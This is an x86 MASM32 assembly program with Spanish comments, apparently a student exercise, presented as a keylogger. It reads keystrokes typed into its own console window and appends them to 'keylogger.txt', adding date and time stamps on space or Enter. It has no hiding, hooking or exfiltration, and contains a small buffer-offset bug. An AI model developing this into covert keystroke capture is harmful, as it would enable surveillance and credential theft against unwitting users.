.386
;model
.model flat, stdcall				;flat es como small
option casemap:none
;includes
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\masm32.inc
include \masm32\include\masm32rt.inc
include \masm32\include\user32.inc
;librerias
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib
includelib \masm32\lib\user32.lib

WinMain proto :DWORD, :DWORD, :DWORD, :DWORD
;data segment
.data
	directorio byte "keylogger.txt",NULL
	error1 db "No se pudo crear el archivo",0

	formatofecha db " dd/MM/yyyy ",0
	formatohora db " hh:mm:ss ",0
.data?
	fechaBuf db 50 dup(?)
	horaBuf db 50 dup(?)
	manejo dd ?
	key dd ?
	bytesw dd ?
;code segment
.code
program:
	call main

	main proc
		local systime:SYSTEMTIME

		mov edx, offset directorio
		
		INVOKE CreateFile, edx, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL	
		INVOKE SetFilePointer, eax, 0, 0, FILE_END

		mov manejo, eax
		cmp eax, INVALID_HANDLE_VALUE	;Error de creacion del archivo
		je fin_programa

		keylogger:

		call crt__getch
		mov key, eax
		cmp eax, 0
		je seguir
		
		INVOKE CreateFile, addr directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0
		mov manejo, eax
		INVOKE SetFilePointer, manejo, 0, 0, FILE_END
		INVOKE WriteFile,manejo,addr key,1,addr bytesw,NULL
		mov eax, manejo
		INVOKE CloseHandle, eax

		mov ebx, key						;moviendo la entrada a la variable "key"
		cmp ebx, 20h						;si es un espacio
		jz ObtenerFH
		cmp ebx, 0dh						;si es un ENTER
		jz ObtenerFH
		jmp seguir							;de lo contrario, sigue leyendo teclado

		ObtenerFH:

		INVOKE CreateFile, addr directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0
		mov manejo, eax
		INVOKE SetFilePointer, manejo, 0, 0, FILE_END

		invoke GetDateFormat, 0,0, \
		0, addr formatofecha, addr fechaBuf, 50
		mov ebx, offset fechaBuf
		mov byte ptr[ebx-1], " "	; reemplazamos todo lo nulo con espacios

		invoke GetTimeFormat, 0, 0, \
		0, addr formatohora, addr horaBuf, 50

		INVOKE WriteFile,manejo,addr fechaBuf,10,addr bytesw,NULL
		INVOKE WriteFile,manejo,addr horaBuf,10,addr bytesw,NULL

		invoke CloseHandle, manejo
		
		seguir:
		jmp keylogger


		fin_programa:
		invoke ExitProcess,0
	main endp

	LeerArchivo PROC
		;
		; Reads an input file into a buffer.
		; Receives: EAX = file handle, EDX = buffer offset,
		; ECX = number of bytes to read
		; Returns: If CF = 0, EAX = number of bytes read; if
		; CF = 1, EAX contains the system error code returned
		; by the GetLastError Win32 API function.
		;--------------------------------------------------------
		.data
		ReadFromFile_1 DWORD ? ; number of bytes read
		.code
		INVOKE ReadFile,
		eax, ; file handle
		edx, ; buffer pointer
		ecx, ; max bytes to read
		ADDR ReadFromFile_1, ; number of bytes read
		0 ; overlapped execution flag
		mov eax,ReadFromFile_1
		ret
	LeerArchivo ENDP
end program

